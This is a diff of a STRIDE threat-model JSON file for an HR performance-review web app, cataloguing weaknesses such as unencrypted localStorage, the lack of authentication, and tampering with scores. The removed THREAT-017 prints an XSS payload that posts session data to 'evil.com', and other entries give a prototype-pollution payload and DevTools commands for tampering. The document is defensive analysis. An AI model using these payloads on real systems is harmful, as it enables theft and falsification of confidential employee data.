@@ -1,407 +1,509 @@
-{
-  "timestamp": "2025-12-09T00:00:00Z",
-  "application": "HR Performance Scoring Web Application (TSS PPM)",
-  "version": "1.2.1",
-  "methodology": "STRIDE Threat Modeling",
-  "threats": [
-    {
-      "id": "THREAT-001",
-      "category": "Spoofing",
-      "title": "Session Code Enumeration Attack",
-      "description": "Session codes are generated using UUID v4 but only 10 characters (uppercase alphanumeric). An attacker could potentially enumerate session codes to access other users' performance review data. With 36^10 possible combinations, targeted attacks against specific timeframes are feasible.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (generateSessionCode function, line 10-13)"
-      ],
-      "attack_vector": "Attacker iterates through possible session codes, loads them from localStorage of a shared device, or intercepts session codes from URLs/screenshots to access unauthorized performance data.",
-      "severity": "High",
-      "likelihood": "Medium",
-      "evidence": "Code analysis shows: const uuid = uuidv4().replace(/-/g, '').toUpperCase(); return uuid.substring(0, 10); No cryptographic strength validation or rate limiting on session access."
-    },
-    {
-      "id": "THREAT-002",
-      "category": "Spoofing",
-      "title": "No Authentication Mechanism",
-      "description": "The application has zero authentication or authorization controls. Anyone with physical or remote access to a device can access all locally stored performance review sessions. No user login, no role-based access control, no session validation.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\FormContext.jsx",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js"
-      ],
-      "attack_vector": "Attacker gains physical access to a manager's device, opens browser DevTools, navigates to Application > Local Storage, and reads all hr_performance_sessions data in plaintext including employee names, scores, and confidential manager comments.",
-      "severity": "Critical",
-      "likelihood": "High",
-      "evidence": "SECURITY.md confirms: 'The application has NO authentication or authorization mechanisms. No user login/registration system, No access controls, No role-based permissions.' All files lack any authentication logic."
-    },
-    {
-      "id": "THREAT-003",
-      "category": "Tampering",
-      "title": "localStorage Data Manipulation",
-      "description": "Session data stored in localStorage is unencrypted and has no integrity checks (HMAC, signatures). Attackers with DevTools access can directly modify performance scores, competency ratings, goal weights, timestamps, and manager comments without detection.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (saveSession, loadSession functions)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\FormContext.jsx (auto-save logic)"
-      ],
-      "attack_vector": "Employee accesses their own performance review session, opens browser DevTools, navigates to localStorage, edits JSON data to inflate scores from 1 to 3, changes competency ratings, manipulates goal weights, or alters timestamps to bypass 14-day expiration.",
-      "severity": "Critical",
-      "likelihood": "High",
-      "evidence": "Code shows localStorage.setItem(STORAGE_KEY, JSON.stringify(sessions)) with no encryption or integrity validation. No HMAC, no digital signatures, no checksum validation found in codebase."
-    },
-    {
-      "id": "THREAT-004",
-      "category": "Tampering",
-      "title": "Client-Side Validation Bypass",
-      "description": "All validation logic runs client-side only. Attackers can modify JavaScript in memory, bypass weight sum validation (must equal 100%), skip required field checks, or manipulate scoring calculations before DOCX generation.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\scoring.js (validateForm, validateWeights)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\components\\Actions.jsx (download validation)"
-      ],
-      "attack_vector": "Attacker modifies validateForm function in browser memory to always return {isValid: true}, bypassing all validation rules. Downloads fraudulent DOCX reports with invalid data (weights not summing to 100%, missing required fields, manipulated VETO rule).",
-      "severity": "High",
-      "likelihood": "Medium",
-      "evidence": "All validation in scoring.js is client-side. Actions.jsx line 28-32 shows: const validation = validate(); if (!validation.isValid) { alert(...); return; } - easily bypassed via browser console."
-    },
-    {
-      "id": "THREAT-005",
-      "category": "Tampering",
-      "title": "Timestamp Manipulation for Session Extension",
-      "description": "14-day session expiration relies solely on client-side timestamp validation. Attackers can modify the timestamp field in localStorage to extend sessions indefinitely, bypassing the automatic cleanup mechanism.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (isSessionExpired function, line 46-51)"
-      ],
-      "attack_vector": "Before a session expires, attacker opens localStorage, finds their session object, changes the timestamp field to Date.now(), effectively resetting the 14-day countdown. Data persists beyond intended retention period.",
-      "severity": "Medium",
-      "likelihood": "Medium",
-      "evidence": "Code shows: const expiryTime = SESSION_EXPIRY_DAYS * 24 * 60 * 60 * 1000; return Date.now() - session.timestamp > expiryTime; Timestamp is stored in session object and directly modifiable."
-    },
-    {
-      "id": "THREAT-006",
-      "category": "Repudiation",
-      "title": "No Audit Trail or Action Logging",
-      "description": "The application lacks any logging or audit trail mechanism. No records exist of who created sessions, who modified data, when changes occurred, or who downloaded reports. All actions are repudiable.",
-      "affected_components": [
-        "Entire codebase - no logging infrastructure exists"
-      ],
-      "attack_vector": "Malicious employee modifies their own performance data, downloads fraudulent report, and denies any wrongdoing. No evidence trail exists to prove tampering or establish accountability.",
-      "severity": "Medium",
-      "likelihood": "High",
-      "evidence": "Grep search for 'audit|log.*action|log.*event' returned no files. No audit logging mechanism exists in the application. Console.log statements exist but are for debugging only, not audit purposes."
-    },
-    {
-      "id": "THREAT-007",
-      "category": "Repudiation",
-      "title": "Non-Attributable Report Generation",
-      "description": "Generated DOCX reports contain no digital signatures, watermarks, or cryptographic proof of authenticity. Reports can be easily forged, modified after generation, or repudiated by creators.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\docxGenerator.js (generateReport function)"
-      ],
-      "attack_vector": "Employee generates legitimate report, opens DOCX in Microsoft Word, modifies content (scores, comments, competencies), saves with same filename. No mechanism exists to detect post-generation tampering or verify report authenticity.",
-      "severity": "High",
-      "likelihood": "High",
-      "evidence": "DOCX generation code shows no digital signatures, no watermarking, no embedded checksums. Footer includes session code and date (line 434-450) but these are plain text and easily altered."
-    },
-    {
-      "id": "THREAT-008",
-      "category": "Information Disclosure",
-      "title": "Unencrypted Sensitive Data in localStorage",
-      "description": "Highly sensitive employee performance data is stored in plaintext in localStorage, including employee names, performance scores, manager confidential comments, competency ratings, and self-assessments. Data persists for 14 days unencrypted.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (saveAllSessions function)"
-      ],
-      "attack_vector": "Attacker gains physical access to manager's laptop, opens Chrome/Edge DevTools, navigates to Application > Local Storage > hr_performance_sessions, exports all JSON data containing multiple employees' confidential performance reviews. Browser sync features may also leak data across devices.",
-      "severity": "Critical",
-      "likelihood": "High",
-      "evidence": "SECURITY.md confirms: 'No encryption at rest, Plaintext storage of potentially sensitive performance data, Accessible via browser DevTools or file system access.' Code shows direct JSON.stringify with no encryption layer."
-    },
-    {
-      "id": "THREAT-009",
-      "category": "Information Disclosure",
-      "title": "Excessive Console Logging of Sensitive Data",
-      "description": "Application logs sensitive information to browser console including transcription results, session codes, audio file sizes, model loading status. Console logs persist in browser history and can be accessed via DevTools.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\hooks\\useWhisper.js (line 131, 224, 239)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\hooks\\useVoiceInput.js (line 201, 216, 231)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\WhisperContext.jsx (line 117, 134, 137)"
-      ],
-      "attack_vector": "Manager uses voice input to dictate confidential performance comments. All transcribed text is logged to console via console.log('Transcription result:', text). Attacker opens DevTools Console and reads historical logs containing sensitive manager feedback.",
-      "severity": "Medium",
-      "likelihood": "Medium",
-      "evidence": "Grep found 42 console.log occurrences across 8 files. Examples: useWhisper.js line 224 logs full transcription text, useVoiceInput.js line 216 logs data.text result, session.js logs error details."
-    },
-    {
-      "id": "THREAT-010",
-      "category": "Information Disclosure",
-      "title": "Error Messages Exposing Implementation Details",
-      "description": "Error handling reveals technical implementation details through user-facing alerts and console errors. Stack traces, file paths, and internal error messages expose attack surface information.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (line 24, 37)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\hooks\\useWhisper.js (line 228)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\components\\Actions.jsx (line 39-40)"
-      ],
-      "attack_vector": "Attacker intentionally triggers errors (malformed audio files, localStorage quota exhaustion, invalid JSON) to gather information about application internals, file structure, dependency versions, and error handling logic for follow-up attacks.",
-      "severity": "Low",
-      "likelihood": "Medium",
-      "evidence": "Actions.jsx shows: console.error('Error generating report:', error); alert('Error generating report. Please try again.'); whisper_server_faster.py line 158: traceback.print_exc() exposes full stack traces."
-    },
-    {
-      "id": "THREAT-011",
-      "category": "Information Disclosure",
-      "title": "Browser Sync Data Leakage",
-      "description": "localStorage data may synchronize across devices if user has browser sync enabled (Chrome Sync, Edge Sync). Confidential performance data could leak to personal devices, shared computers, or compromised accounts.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (all localStorage operations)"
-      ],
-      "attack_vector": "Manager logs into work computer with personal Google account that has Chrome Sync enabled. HR performance data in localStorage syncs to personal laptop, tablet, or smartphone. Data persists on personal devices after work session ends.",
-      "severity": "High",
-      "likelihood": "Medium",
-      "evidence": "SECURITY.md notes: 'Browser sync features could leak data across devices.' No mechanism exists to prevent sync or detect unauthorized device access. Privacy policy mentions local storage but not sync risks."
-    },
-    {
-      "id": "THREAT-012",
-      "category": "Information Disclosure",
-      "title": "Missing Content Security Policy (CSP)",
-      "description": "Application lacks Content Security Policy headers allowing potential XSS attacks and unauthorized script execution. External scripts like Plausible Analytics load without Subresource Integrity (SRI) validation.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\index.html (Plausible script, line 9)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\nginx.conf (no CSP headers)"
-      ],
-      "attack_vector": "If Plausible.io CDN is compromised or MITM'd, malicious JavaScript executes with full DOM access, reading localStorage, exfiltrating performance data, injecting keyloggers to capture voice input transcriptions.",
-      "severity": "High",
-      "likelihood": "Low",
-      "evidence": "nginx.conf contains no CSP headers. index.html line 9 loads Plausible script without integrity attribute: <script async src='https://plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js'></script>. SECURITY.md confirms: 'No Content Security Policy, External script (Plausible) not integrity-checked.'"
-    },
-    {
-      "id": "THREAT-013",
-      "category": "Denial of Service",
-      "title": "localStorage Quota Exhaustion Attack",
-      "description": "No input length limits exist on text fields (goals, comments, self-assessment). Attacker can fill localStorage (typically 5-10MB limit) causing application failure, data loss for other sessions, or browser instability.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\FormContext.jsx (updateFormData, all update functions)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (no size validation)"
-      ],
-      "attack_vector": "Attacker creates session, pastes 5MB of text into self-assessment field, triggers auto-save. localStorage quota exceeded, saveSession fails silently, legitimate sessions cannot be saved, data loss occurs.",
-      "severity": "Medium",
-      "likelihood": "Low",
-      "evidence": "SECURITY.md notes: 'No input length limits (potential DoS via localStorage quota exhaustion).' Code review shows no maxLength attributes on textareas, no size validation in session.js."
-    },
-    {
-      "id": "THREAT-014",
-      "category": "Denial of Service",
-      "title": "Whisper Server Audio Upload Flooding",
-      "description": "The /transcribe endpoint has no authentication or rate limiting. Attackers can flood the server with large audio files (up to 50MB per nginx config) exhausting CPU, memory, and disk resources.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\server\\whisper_server_faster.py (transcribe endpoint, line 87-169)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\nginx.conf (proxy config, line 26-41)"
-      ],
-      "attack_vector": "Attacker scripts automated POST requests to /transcribe endpoint with 50MB audio files. No rate limiting exists. Whisper processing is CPU-intensive (120s timeout). Multiple parallel requests exhaust 4GB memory limit, crash container, deny service to legitimate users.",
-      "severity": "High",
-      "likelihood": "Medium",
-      "evidence": "nginx.conf line 40: client_max_body_size 50M; whisper_server_faster.py has no rate limiting logic. SECURITY.md confirms: 'No rate limiting on voice transcription endpoint, No authentication on upload endpoint.' Docker memory limit is 4GB (docker-compose.yml line 48)."
-    },
-    {
-      "id": "THREAT-015",
-      "category": "Denial of Service",
-      "title": "Malicious Audio File Processing",
-      "description": "Whisper server accepts arbitrary audio files with minimal validation. Malformed files, audio bombs (compressed files expanding to GB), or files exploiting ffmpeg/librosa vulnerabilities can crash the service.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\server\\whisper_server_faster.py (audio processing, line 51-73, 124-135)"
-      ],
-      "attack_vector": "Attacker uploads specially crafted audio file exploiting ffmpeg vulnerability (CVE-2021-38114 or similar). Subprocess.run executes ffmpeg with malicious input, causing buffer overflow, arbitrary code execution, or service crash. Alternatively, audio bomb decompresses to 10GB causing OOM.",
-      "severity": "High",
-      "likelihood": "Low",
-      "evidence": "whisper_server_faster.py line 55-59 uses subprocess.run with ffmpeg without file validation: subprocess.run(['ffmpeg', '-i', input_path, ...]). No magic number validation, no file type whitelist, only extension-based detection. SECURITY.md: 'Extension-based validation can be spoofed, No file size limits enforced, No authentication on upload endpoint.'"
-    },
-    {
-      "id": "THREAT-016",
-      "category": "Denial of Service",
-      "title": "No Rate Limiting on DOCX Generation",
-      "description": "DOCX generation endpoint (client-side) has no rate limiting. Attacker can repeatedly trigger report generation causing browser tab freeze, excessive memory usage, or client-side DoS.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\components\\Actions.jsx (handleDownload function)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\docxGenerator.js"
-      ],
-      "attack_vector": "Attacker writes script to rapidly click Download button 1000 times. Each click triggers CPU-intensive DOCX generation with large documents (9 goals, 6 competencies, grid rendering). Browser becomes unresponsive, tab crashes, user loses unsaved work.",
-      "severity": "Low",
-      "likelihood": "Low",
-      "evidence": "Actions.jsx shows basic isGenerating state (line 10) but no actual rate limiting. No debouncing, no request queuing, no maximum requests per timeframe. User can spam-click download button."
-    },
-    {
-      "id": "THREAT-017",
-      "category": "Elevation of Privilege",
-      "title": "XSS via Voice Input Transcription",
-      "description": "While sanitizeInput HTML-encodes stored data, adversarial audio could potentially produce XSS strings through Whisper transcription. If sanitization is bypassed or React auto-escaping fails, stored XSS becomes possible.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\hooks\\useWhisper.js (transcription result handling)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (sanitizeInput function)"
-      ],
-      "attack_vector": "Attacker trains adversarial audio example that when transcribed produces: <script>fetch('evil.com',{method:'POST',body:localStorage.hr_performance_sessions})</script>. If sanitization has bugs or is bypassed, XSS executes when data is rendered, exfiltrating all localStorage data.",
-      "severity": "Medium",
-      "likelihood": "Low",
-      "evidence": "sanitizeInput function (session.js line 159-169) encodes HTML entities. However, SECURITY.md notes potential for 'Adversarial audio to produce XSS strings via Whisper.' React JSX provides auto-escaping but preview modal (Actions.jsx) renders user content which could bypass protections if sanitization fails."
-    },
-    {
-      "id": "THREAT-018",
-      "category": "Elevation of Privilege",
-      "title": "Whisper Model Integrity Compromise",
-      "description": "Whisper models downloaded from Hugging Face CDN lack integrity checks (no checksums, no SRI). MITM attacker or compromised CDN could serve malicious ML model that executes arbitrary code during inference or produces manipulated transcriptions.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\WhisperContext.jsx (model loading, line 86-156)",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\hooks\\useBrowserWhisper.js"
-      ],
-      "attack_vector": "MITM attacker intercepts HTTPS connection to cdn.huggingface.co, serves malicious ONNX model instead of legitimate whisper-small. Model contains exploit code that executes when pipeline() runs, gaining arbitrary JavaScript execution in user context, accessing localStorage, exfiltrating data.",
-      "severity": "Medium",
-      "likelihood": "Low",
-      "evidence": "WhisperContext.jsx line 120-128 uses pipeline() with MODEL_ID from Hugging Face without integrity validation. SECURITY.md confirms: '500MB Whisper-small model could be MITM'd, Cache poisoning risk for model files, No model checksum verification, No Subresource Integrity for model downloads.'"
-    },
-    {
-      "id": "THREAT-019",
-      "category": "Elevation of Privilege",
-      "title": "Prototype Pollution via JSON.parse",
-      "description": "Application uses JSON.parse to deserialize localStorage data without prototype pollution protection. Malicious JSON payloads with __proto__ keys could pollute Object prototype, leading to property injection or RCE in downstream code.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\utils\\session.js (getAllSessions function, line 22)"
-      ],
-      "attack_vector": "Attacker injects malicious session into localStorage with payload: {'__proto__': {'isAdmin': true}}. JSON.parse deserializes this, polluting Object.prototype. If application checks object.isAdmin anywhere, attacker gains elevated privileges or bypasses validation.",
-      "severity": "Medium",
-      "likelihood": "Low",
-      "evidence": "session.js line 22: return stored ? JSON.parse(stored) : {}; No prototype pollution protection like Object.create(null) or JSON parse reviver function. Grep found no prototype pollution defenses in codebase."
-    },
-    {
-      "id": "THREAT-020",
-      "category": "Elevation of Privilege",
-      "title": "CORS Misconfiguration on Whisper Server",
-      "description": "Whisper server has CORS enabled via flask_cors without origin restrictions. In production if accessible from public internet, any malicious website could make cross-origin requests to /transcribe, potentially abusing the service or exfiltrating data.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\server\\whisper_server_faster.py (line 17: CORS(app))"
-      ],
-      "attack_vector": "Attacker hosts malicious website that makes fetch() requests to production Whisper server's /transcribe endpoint. CORS allows cross-origin requests. Attacker abuses service to transcribe malicious audio, waste resources, or probe for vulnerabilities.",
-      "severity": "Low",
-      "likelihood": "Low",
-      "evidence": "whisper_server_faster.py line 17: CORS(app) with no origin restrictions. However, nginx proxies endpoint so direct access may be blocked. Docker deployment uses bridge network isolation (docker-compose.yml) limiting exposure."
-    },
-    {
-      "id": "THREAT-021",
-      "category": "Tampering + Information Disclosure",
-      "title": "Session Code Exposure via URL Parameters",
-      "description": "If session codes are ever passed via URL parameters or query strings (for session sharing), they could be logged in browser history, server access logs, proxy logs, or leaked via Referer headers.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\components\\Header.jsx",
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\FormContext.jsx"
-      ],
-      "attack_vector": "Manager shares session via URL: https://app.example.com?session=ABC1234567. Session code appears in: browser history (permanent), server access logs, proxy/CDN logs, Google Analytics (if tracking query params), Referer header when navigating away. Data leak persists indefinitely.",
-      "severity": "Medium",
-      "likelihood": "Medium",
-      "evidence": "While current implementation uses SessionsList component, the architecture with 10-character session codes and lack of authentication suggests URL sharing might be a future feature or user workaround. No evidence of URL parameter handling found, but risk exists if implemented."
-    },
-    {
-      "id": "THREAT-022",
-      "category": "Information Disclosure",
-      "title": "Plausible Analytics Privacy Leak",
-      "description": "Plausible Analytics script loads from external domain without SRI. If Plausible account is compromised or script modified, analytics could collect PII, session codes, or sensitive form data beyond intended page view tracking.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\index.html (line 9-13)"
-      ],
-      "attack_vector": "Plausible.io account gets compromised. Attacker modifies analytics script to track custom events capturing employee names, session codes, or performance scores. Data exfiltrated to attacker server. Users unaware of extended tracking.",
-      "severity": "Low",
-      "likelihood": "Low",
-      "evidence": "index.html loads Plausible script without SRI: <script async src='https://plausible.io/js/pa-OVp2RFVy8CfsubEwNvi3F.js'></script>. Privacy policy states Plausible is GDPR-compliant but provides no guarantees against script compromise."
-    },
-    {
-      "id": "THREAT-023",
-      "category": "Tampering",
-      "title": "Docker Container Running as Root",
-      "description": "Docker containers run as root user (no USER directive in Dockerfiles). If container is compromised via ffmpeg exploit or other vulnerability, attacker has root privileges within container, can escape to host, or persist malware.",
-      "affected_components": [
-        "Dockerfile.whisper (missing USER directive)",
-        "Dockerfile.frontend (missing USER directive)"
-      ],
-      "attack_vector": "Attacker exploits ffmpeg vulnerability in Whisper container (THREAT-015). Gains root shell inside container. Uses kernel exploit to escape container, compromises Docker host, accesses other containers or host filesystem.",
-      "severity": "High",
-      "likelihood": "Low",
-      "evidence": "SECURITY.md confirms: 'Running as root: No USER directive in Dockerfiles, Containers run as root, No read-only filesystems.' docker-compose.yml shows no user: directives or securityContext configurations."
-    },
-    {
-      "id": "THREAT-024",
-      "category": "Information Disclosure",
-      "title": "Missing HTTP Security Headers",
-      "description": "nginx.conf lacks critical HTTP security headers: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy. Application vulnerable to clickjacking, MIME-sniffing attacks, downgrade attacks.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\nginx.conf"
-      ],
-      "attack_vector": "Attacker embeds application in <iframe> on malicious site (no X-Frame-Options). Uses clickjacking to trick user into clicking invisible buttons that delete sessions or download fraudulent reports. Or MITM downgrades HTTPS to HTTP (no HSTS), intercepts credentials if authentication ever added.",
-      "severity": "Medium",
-      "likelihood": "Low",
-      "evidence": "nginx.conf review shows no security headers except cache control. SECURITY.md recommends adding: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Strict-Transport-Security, Referrer-Policy, Permissions-Policy."
-    },
-    {
-      "id": "THREAT-025",
-      "category": "Denial of Service",
-      "title": "Whisper Model Download During Peak Usage",
-      "description": "When browser backend is active, Whisper model auto-downloads on first use (500MB for whisper-small). During company-wide performance review season, simultaneous downloads from multiple users could overwhelm network bandwidth or Hugging Face CDN rate limits.",
-      "affected_components": [
-        "C:\\Users\\s.vanas\\Projects\\tss_ppm\\hr-performance-app\\src\\contexts\\WhisperContext.jsx (auto-preload logic, line 234-239)"
-      ],
-      "attack_vector": "100 managers simultaneously access app during review deadline. Each browser attempts to download 500MB Whisper model. Network bandwidth saturated (50GB total). Corporate firewall or Hugging Face rate limiting blocks downloads. Voice input feature becomes unavailable, users cannot complete reviews.",
-      "severity": "Low",
-      "likelihood": "Medium",
-      "evidence": "WhisperContext.jsx line 236-238 shows auto-preload: if (activeBackend === 'browser' && !isModelReady && !isModelLoading) { preloadModel(); } No model caching across users, no CDN proxying, each user downloads independently."
-    }
-  ],
-  "summary": {
-    "total_threats": 25,
-    "by_severity": {
-      "Critical": 3,
-      "High": 10,
-      "Medium": 10,
-      "Low": 2
-    },
-    "by_category": {
-      "Spoofing": 2,
-      "Tampering": 5,
-      "Repudiation": 2,
-      "Information Disclosure": 9,
-      "Denial of Service": 5,
-      "Elevation of Privilege": 4
-    },
-    "critical_findings": [
-      "THREAT-002: No Authentication Mechanism - Anyone can access all performance data",
-      "THREAT-003: localStorage Data Manipulation - Performance scores can be altered without detection",
-      "THREAT-008: Unencrypted Sensitive Data in localStorage - Confidential employee data stored in plaintext"
+[
+  {
+    "id": "THREAT-001",
+    "category": "Information Disclosure",
+    "title": "Unencrypted Performance Data in Browser localStorage",
+    "description": "All employee performance review data including names, goals, performance scores, competency assessments, manager comments, and self-assessments are stored in browser localStorage in unencrypted plain text JSON format. The data persists for 14 days and can be accessed by anyone with physical access to the device, malicious browser extensions, or through XSS vulnerabilities.",
+    "severity": "critical",
+    "affected_components": [
+      "localStorage",
+      "FormContext",
+      "session.js"
     ],
-    "immediate_actions_required": [
-      "Implement Content Security Policy headers",
-      "Add HTTP security headers (X-Frame-Options, HSTS, X-Content-Type-Options)",
-      "Implement rate limiting on /transcribe endpoint",
-      "Add audio file validation with magic number checks",
-      "Consider localStorage encryption using Web Crypto API",
-      "Add authentication system for production deployment"
-    ]
-  },
-  "risk_assessment": {
-    "overall_risk": "HIGH",
-    "suitable_for": [
-      "Non-confidential performance reviews",
-      "Internal use within trusted environments",
-      "Scenarios with ensured physical device security",
-      "Proof-of-concept or development purposes"
+    "attack_scenario": "An attacker with physical access to an unlocked computer opens browser DevTools Console and executes: localStorage.getItem('hr_performance_sessions'). They immediately gain access to all saved performance reviews containing sensitive employee data. Alternatively, a malicious browser extension with broad permissions reads localStorage and exfiltrates all HR data to a remote server.",
+    "vulnerability_types": [
+      "CWE-312",
+      "CWE-922"
     ],
-    "not_suitable_for": [
-      "Highly confidential performance data",
-      "Multi-tenant environments",
-      "Compliance-regulated industries (HIPAA, SOX, GDPR strict interpretation)",
-      "Public-facing deployment without authentication",
-      "Environments requiring auditability or non-repudiation"
-    ]
+    "mitigation": "Implement client-side encryption using Web Crypto API with password-derived keys. Alternatively, migrate to Phase 2/3 architecture with server-side encrypted storage and proper authentication/authorization. Reduce retention period from 14 days. Add warning banners about data storage risks."
   },
-  "references": {
-    "security_assessment": "C:\\Users\\s.vanas\\Projects\\tss_ppm\\.securevibes\\SECURITY.md",
-    "methodology": "STRIDE Threat Modeling (Microsoft)",
-    "cwe_references": [
-      "CWE-287: Improper Authentication",
-      "CWE-311: Missing Encryption of Sensitive Data",
-      "CWE-345: Insufficient Verification of Data Authenticity",
-      "CWE-352: Cross-Site Request Forgery (CSRF)",
-      "CWE-79: Cross-site Scripting (XSS)",
-      "CWE-400: Uncontrolled Resource Consumption",
-      "CWE-1333: Inefficient Regular Expression Complexity"
-    ]
+  {
+    "id": "THREAT-002",
+    "category": "Spoofing",
+    "title": "Session Code Hijacking via Shoulder Surfing or Shared Devices",
+    "description": "Session codes are only 10 alphanumeric characters (case-insensitive) and are displayed prominently in the UI. No authentication is required to resume any session. An attacker who observes or guesses a session code can access and modify another user's performance review data on any device.",
+    "severity": "high",
+    "affected_components": [
+      "SessionsList.jsx",
+      "session.js",
+      "FormContext"
+    ],
+    "attack_scenario": "Manager leaves their screen visible during a video call, exposing session code 'A7B3K9M2P1'. Attacker navigates to the application on their own device, clicks 'Resume Session', enters the code, and gains full access to the performance review. They can read sensitive feedback, modify scores, or delete the session entirely. No audit trail exists of this unauthorized access.",
+    "vulnerability_types": [
+      "CWE-287",
+      "CWE-306"
+    ],
+    "mitigation": "Implement device fingerprinting to bind sessions to specific browsers/devices. Add optional PIN/password protection for sensitive sessions. Increase session code entropy to 16+ characters with case sensitivity. Implement Phase 2/3 authentication with JWT tokens and user accounts."
+  },
+  {
+    "id": "THREAT-003",
+    "category": "Denial of Service",
+    "title": "Whisper Server Resource Exhaustion via Large Audio Files",
+    "description": "The /transcribe endpoint accepts audio files up to 50MB without rate limiting or authentication. An attacker can submit multiple large audio files simultaneously, exhausting CPU and memory resources. The Whisper model processing is CPU-intensive (especially for 'small' or larger models), and concurrent requests can completely block legitimate users.",
+    "severity": "high",
+    "affected_components": [
+      "whisper_server_faster.py",
+      "Caddy reverse proxy",
+      "Docker Whisper container"
+    ],
+    "attack_scenario": "Attacker discovers the unauthenticated /transcribe endpoint (exposed via Caddy). They write a script to submit 100 concurrent requests with 50MB audio files every minute. The Whisper server's 2 Gunicorn workers become completely saturated with 2-minute transcription jobs. All legitimate voice input attempts fail with timeouts. The Docker container hits its 4GB memory limit and gets OOM-killed repeatedly.",
+    "vulnerability_types": [
+      "CWE-770",
+      "CWE-400",
+      "CWE-307"
+    ],
+    "mitigation": "Implement rate limiting at Caddy level (per-IP limits on /whisper/* routes). Add request authentication or at minimum API key validation. Reduce maximum audio file size to 10MB. Implement request queuing with max queue length. Add monitoring and auto-scaling for Whisper containers."
+  },
+  {
+    "id": "THREAT-004",
+    "category": "Tampering",
+    "title": "Performance Score Manipulation via Browser DevTools",
+    "description": "Since all business logic runs client-side with no server validation, an attacker can use browser DevTools to directly modify React state, localStorage, or intercept/modify functions to change performance scores, competency ratings, and calculated grid positions before generating the DOCX report.",
+    "severity": "high",
+    "affected_components": [
+      "FormContext",
+      "scoring.js",
+      "docxGenerator.js",
+      "localStorage"
+    ],
+    "attack_scenario": "Manager opens DevTools Console during a performance review. They execute: localStorage.setItem('hr_performance_sessions', JSON.stringify(modified_data)) where all competency scores are changed from 1 to 3, lifting an employee from red zone (1,1) to dark green (3,3). They download the report which now shows fabricated excellent performance. No audit trail or validation exists to detect this tampering.",
+    "vulnerability_types": [
+      "CWE-602",
+      "CWE-353"
+    ],
+    "mitigation": "Migrate to Phase 2/3 architecture with server-side validation and tamper detection. Implement digital signatures on exported DOCX files with timestamps and manager identity. Add checksums to localStorage data to detect tampering. Create audit logs of all score changes with timestamps."
+  },
+  {
+    "id": "THREAT-005",
+    "category": "Repudiation",
+    "title": "Complete Lack of Audit Trail for Performance Reviews",
+    "description": "The application provides no logging of who created, viewed, modified, or deleted performance reviews. No timestamps exist for individual changes. Managers can deny having written specific comments or given certain scores. Employees can claim scores were changed after discussion. No forensic evidence exists to resolve disputes.",
+    "severity": "high",
+    "affected_components": [
+      "FormContext",
+      "session.js",
+      "All components"
+    ],
+    "attack_scenario": "Manager gives employee negative feedback and low scores (1s and 2s). After the review meeting, manager claims they actually gave higher scores but the system 'lost the data' or employee 'modified it somehow'. Employee saved their session code and can prove the scores, but no timestamped, non-repudiable record exists showing who made what changes when. Legal dispute ensues with no technical evidence.",
+    "vulnerability_types": [
+      "CWE-778",
+      "CWE-778"
+    ],
